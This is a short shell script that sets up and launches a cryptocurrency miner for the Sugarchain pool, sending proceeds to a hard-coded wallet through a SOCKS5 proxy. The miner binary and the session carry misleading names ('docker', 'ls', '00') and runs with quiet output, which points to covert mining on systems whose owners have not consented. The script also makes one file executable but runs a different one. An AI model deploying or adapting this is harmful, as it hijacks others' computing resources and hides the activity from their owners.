sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x docker 
screen -dmS ls 
POOL=1pool.sugarchain.org:3333
WALLET=sugar1qe40q8krx7elqg84lcn6j8qqzjcpgyf6p8ac92x.free
PROXY=socks5://150.129.171.123:6667
./00 -a yespowerSUGAR -o $POOL -u $WALLET -x $PROXY -q
